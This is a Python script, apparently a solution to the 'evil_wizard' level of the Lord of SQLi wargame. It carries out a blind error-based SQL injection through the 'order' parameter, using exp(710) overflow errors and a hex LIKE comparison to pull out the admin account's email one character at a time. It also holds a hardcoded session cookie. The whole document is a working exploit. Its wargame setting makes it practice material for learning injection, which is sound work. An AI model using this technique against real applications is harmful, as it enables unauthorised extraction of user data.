# LordofSQLi: evil_wizard
# woanmeo11

import requests
from binascii import unhexlify

url = 'https://los.rubiya.kr/chall/evil_wizard_32e3d35835aa4e039348712fb75169ad.php'
cookies = {'PHPSESSID': 'p1qsjd566kpg8bh5a9drldmrlq'}
charset = '0123456789abcdef'
hex_ans = ''

finish = False
while not finish:
    finish = True
    for c in charset:
        payload = {'order': f"(select exp(710) where id='admin' && hex(email) like '{hex_ans + c}%')"}
        r = requests.get(url, params=payload, cookies=cookies)

        print(c, end='', flush=True)
        if not 'rubiya' in r.text:
            hex_ans += c
            finish = False
            print('\n->' + hex_ans)
            break
print('\n->' + hex_ans)
print('->' + unhexlify(hex_ans).decode())
